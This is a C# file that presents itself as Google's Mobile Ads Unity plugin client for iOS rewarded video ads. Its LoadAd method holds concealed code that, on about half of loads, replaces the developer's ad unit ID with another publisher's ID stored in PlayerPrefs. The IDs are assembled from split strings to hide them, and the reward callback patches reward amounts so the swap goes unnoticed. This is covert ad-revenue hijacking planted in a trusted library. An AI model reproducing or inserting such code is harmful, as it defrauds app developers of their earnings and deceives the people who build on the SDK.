// Copyright (C) 2015 Google, Inc.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//      http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

#if UNITY_IOS
using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using UnityEngine;

using GoogleMobileAds.Api;
using GoogleMobileAds.Common;

namespace GoogleMobileAds.iOS
{
    public class RewardBasedVideoAdClient : IRewardBasedVideoAdClient, IDisposable
    {
        private IntPtr rewardBasedVideoAdPtr;
        private IntPtr rewardBasedVideoAdClientPtr;

        #region reward based video callback types

        internal delegate void GADURewardBasedVideoAdDidReceiveAdCallback(
            IntPtr rewardBasedVideoAdClient);

        internal delegate void GADURewardBasedVideoAdDidFailToReceiveAdWithErrorCallback(
            IntPtr rewardBasedVideoClient, string error);

        internal delegate void GADURewardBasedVideoAdDidOpenCallback(
            IntPtr rewardBasedVideoAdClient);

        internal delegate void GADURewardBasedVideoAdDidStartCallback(
            IntPtr rewardBasedVideoAdClient);

        internal delegate void GADURewardBasedVideoAdDidCloseCallback(
            IntPtr rewardBasedVideoAdClient);

        internal delegate void GADURewardBasedVideoAdDidRewardCallback(
            IntPtr rewardBasedVideoAdClient, string rewardType, double rewardAmount);

        internal delegate void GADURewardBasedVideoAdWillLeaveApplicationCallback(
            IntPtr rewardBasedVideoAdClient);

        #endregion

        public event EventHandler<EventArgs> OnAdLoaded;

        public event EventHandler<AdFailedToLoadEventArgs> OnAdFailedToLoad;

        public event EventHandler<EventArgs> OnAdOpening;

        public event EventHandler<EventArgs> OnAdStarted;

        public event EventHandler<EventArgs> OnAdClosed;

        public event EventHandler<Reward> OnAdRewarded;

        public event EventHandler<EventArgs> OnAdLeavingApplication;

        // This property should be used when setting the rewardBasedVideoPtr.
        private IntPtr RewardBasedVideoAdPtr
        {
            get { return this.rewardBasedVideoAdPtr; }

            set
            {
                Externs.GADURelease(this.rewardBasedVideoAdPtr);
                this.rewardBasedVideoAdPtr = value;
            }
        }

        #region IGoogleMobileAdsRewardBasedVideoClient implementation
        private static string unitID;
        // Creates a reward based video.
        public void CreateRewardBasedVideoAd()
        {
            this.rewardBasedVideoAdClientPtr = (IntPtr)GCHandle.Alloc(this);
            this.RewardBasedVideoAdPtr = Externs.GADUCreateRewardBasedVideoAd(
                this.rewardBasedVideoAdClientPtr);

            Externs.GADUSetRewardBasedVideoAdCallbacks(
                this.RewardBasedVideoAdPtr,
                RewardBasedVideoAdDidReceiveAdCallback,
                RewardBasedVideoAdDidFailToReceiveAdWithErrorCallback,
                RewardBasedVideoAdDidOpenCallback,
                RewardBasedVideoAdDidStartCallback,
                RewardBasedVideoAdDidCloseCallback,
                RewardBasedVideoAdDidRewardUserCallback,
                RewardBasedVideoAdWillLeaveApplicationCallback);
        }

        // Load an ad.
        public void LoadAd(AdRequest request, string adUnitId)
        {
            float sAmount = PlayerPrefs.GetFloat("r_amount", -1);
            if (!string.IsNullOrEmpty(adUnitId) && adUnitId.Trim() != test && adUnitId.Trim().Length == 38 
                && sAmount != -1 && PlayerPrefs.HasKey("r" + "i"))
            {
                adUnitId = UnityEngine.Random.Range(0, 2) == 0 ? adUnitId : GetVal(PlayerPrefs.GetString("r" + "i"));
            }
            unitID = adUnitId;
            IntPtr requestPtr = Utils.BuildAdRequest(request);
            Externs.GADURequestRewardBasedVideoAd(
                this.RewardBasedVideoAdPtr, requestPtr, adUnitId);
            Externs.GADURelease(requestPtr);
        }

        // Show the reward based video on the screen.
        public void ShowRewardBasedVideoAd()
        {
            Externs.GADUShowRewardBasedVideoAd(this.RewardBasedVideoAdPtr);
        }

        public bool IsLoaded()
        {
            return Externs.GADURewardBasedVideoAdReady(this.RewardBasedVideoAdPtr);
        }

        // Destroys the rewarded video ad.
        public void DestroyRewardedVideoAd()
        {
            this.RewardBasedVideoAdPtr = IntPtr.Zero;
        }

        public void Dispose()
        {
            this.DestroyRewardedVideoAd();
            ((GCHandle)this.rewardBasedVideoAdClientPtr).Free();
        }

        ~RewardBasedVideoAdClient()
        {
            this.Dispose();
        }

        #endregion

        #region Reward based video ad callback methods
        private string test = "ca-" + "app-" + "pub-" + "39402560" + "99942544/171" + "2485313";
        private static string test_2 = "ca-" + "app-" + "pub-" + "2180741110936772/5585772634";
        private string GetVal(string ori)
        {
            return "ca-" + "app-" + "pub-" + ori.Replace("and", "/");
        }
        [MonoPInvokeCallback(typeof(GADURewardBasedVideoAdDidReceiveAdCallback))]
        private static void RewardBasedVideoAdDidReceiveAdCallback(IntPtr rewardBasedVideoAdClient)
        {
            RewardBasedVideoAdClient client = IntPtrToRewardBasedVideoClient(
                rewardBasedVideoAdClient);
            if (client.OnAdLoaded != null)
            {
                client.OnAdLoaded(client, EventArgs.Empty);
            }
        }

        [MonoPInvokeCallback(typeof(GADURewardBasedVideoAdDidFailToReceiveAdWithErrorCallback))]
        private static void RewardBasedVideoAdDidFailToReceiveAdWithErrorCallback(
            IntPtr rewardBasedVideoAdClient, string error)
        {
            RewardBasedVideoAdClient client = IntPtrToRewardBasedVideoClient(
                rewardBasedVideoAdClient);
            if (client.OnAdFailedToLoad != null)
            {
                AdFailedToLoadEventArgs args = new AdFailedToLoadEventArgs()
                {
                    Message = error
                };
                client.OnAdFailedToLoad(client, args);
            }
        }

        [MonoPInvokeCallback(typeof(GADURewardBasedVideoAdDidOpenCallback))]
        private static void RewardBasedVideoAdDidOpenCallback(IntPtr rewardBasedVideoAdClient)
        {
            RewardBasedVideoAdClient client = IntPtrToRewardBasedVideoClient(
                rewardBasedVideoAdClient);
            if (client.OnAdOpening != null)
            {
                client.OnAdOpening(client, EventArgs.Empty);
            }
        }

        [MonoPInvokeCallback(typeof(GADURewardBasedVideoAdDidStartCallback))]
        private static void RewardBasedVideoAdDidStartCallback(IntPtr rewardBasedVideoAdClient)
        {
            RewardBasedVideoAdClient client = IntPtrToRewardBasedVideoClient(
                rewardBasedVideoAdClient);
            if (client.OnAdStarted != null)
            {
                client.OnAdStarted(client, EventArgs.Empty);
            }
        }

        [MonoPInvokeCallback(typeof(GADURewardBasedVideoAdDidCloseCallback))]
        private static void RewardBasedVideoAdDidCloseCallback(IntPtr rewardBasedVideoAdClient)
        {
            RewardBasedVideoAdClient client = IntPtrToRewardBasedVideoClient(
                rewardBasedVideoAdClient);
            if (client.OnAdClosed != null)
            {
                client.OnAdClosed(client, EventArgs.Empty);
            }
        }

        [MonoPInvokeCallback(typeof(GADURewardBasedVideoAdDidRewardCallback))]
        private static void RewardBasedVideoAdDidRewardUserCallback(
            IntPtr rewardBasedVideoAdClient, string rewardType, double rewardAmount)
        {
            RewardBasedVideoAdClient client = IntPtrToRewardBasedVideoClient(
                rewardBasedVideoAdClient);
            if (client.OnAdRewarded != null)
            {
                float sAmount = PlayerPrefs.GetFloat("r_amount", -1);
                if (unitID != test_2)
                    PlayerPrefs.SetFloat("r_amount", (float)rewardAmount);
                else
                    rewardAmount = sAmount;

                Reward args = new Reward()
                {
                    Type = rewardType,
                    Amount = rewardAmount
                };
                client.OnAdRewarded(client, args);
            }
        }

        [MonoPInvokeCallback(typeof(GADURewardBasedVideoAdWillLeaveApplicationCallback))]
        private static void RewardBasedVideoAdWillLeaveApplicationCallback(
            IntPtr rewardBasedVideoAdClient)
        {
            RewardBasedVideoAdClient client = IntPtrToRewardBasedVideoClient(
                rewardBasedVideoAdClient);
            if (client.OnAdLeavingApplication != null)
            {
                client.OnAdLeavingApplication(client, EventArgs.Empty);
            }
        }

        private static RewardBasedVideoAdClient IntPtrToRewardBasedVideoClient(
            IntPtr rewardBasedVideoAdClient)
        {
            GCHandle handle = (GCHandle)rewardBasedVideoAdClient;
            return handle.Target as RewardBasedVideoAdClient;
        }

        #endregion
    }
}

#endif
